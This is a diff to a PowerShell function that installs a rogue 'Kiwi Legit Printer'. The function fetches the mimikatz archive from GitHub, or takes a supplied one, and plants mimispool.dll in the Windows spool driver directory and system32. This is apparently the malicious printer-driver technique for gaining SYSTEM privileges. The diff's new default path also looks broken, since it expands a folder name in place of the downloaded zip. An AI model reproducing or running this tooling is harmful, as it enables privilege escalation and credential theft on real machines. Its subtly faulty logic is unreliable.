@@ -1,11 +1,23 @@
 function Install-KiwiPrinter {
+
+    param (
+        [Parameter(Mandatory=$false, HelpMessage="Path to the mimikatz_trunk.zip archive.")]
+        [String]$Archive
+    )
+
     $printerName     = 'Kiwi Legit Printer'
     $system32        = $env:systemroot + '\system32'
     $drivers         = $system32 + '\spool\drivers'
     $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
 
-    Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
-    Expand-Archive -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'
+    if ( ! $Archive ) {
+        Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
+        $mimikatzPath = '.\mimikatz_trunk'
+    } else {
+        $mimikatzPath = $Archive
+    }
+
+    Expand-Archive -Path $mimikatzPath -DestinationPath '.\mimikatz_trunk'
 
     Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
     Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
